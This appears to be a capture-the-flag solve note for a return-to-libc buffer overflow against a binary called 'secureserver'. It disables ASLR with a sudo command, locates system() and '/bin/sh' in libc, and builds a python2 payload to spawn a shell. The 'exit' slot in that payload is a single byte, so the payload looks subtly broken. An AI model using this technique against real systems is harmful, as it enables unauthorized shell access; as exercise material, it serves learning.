### SOLVE
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
set follow-fork-mode child
set follow-fork-mode parent

ldd secureserver


Return to LIBC.
// Locate win-function, control EIP, find jump-point (jmp esp)
```as
main:				0x080491d1	'\xd1\x91\x04\x08'
secret_function:	0x08049186	'\x86\x91\x04\x08'
receive_feedback:	0x08049198	'\x98\x91\x04\x08'
system():			0xf7c4c800	'\x00\xc8\xc4\xf7'
exit():				0xf7c3bc90	'\x90\xbc\xc3\xf7'
jmp esp:			0x08049193	'\x93\x91\x04\x08'
/bin/sh:			0xf7db5faa	'\xaa\x5f\xdb\xf7'
```



0xf7c00000
0xf7c4c800
0xf7db5faa


// Create payload
// [padding + system() + exit() + /bin/sh]
```shell
python2 -c "print('A' * 76 + '\x00\xc8\xc4\xf7' + '\x90' + '\xaa\x5f\xdb\xf7')" > payload
``` 

libc-library => /usr/lib/i386-linux-gnu/libc.so.6
readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep system
strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"

	
libc_base:						ldd secureserver													0xf7c00000	'\x00\x00\xc0\xf7'
offset libc_base to system: 	readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep system			0004c800	'\x00\xc8\x04\x00'
"/bin/sh":						strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"	1b5faa		'\xaa\x5f\x1b'




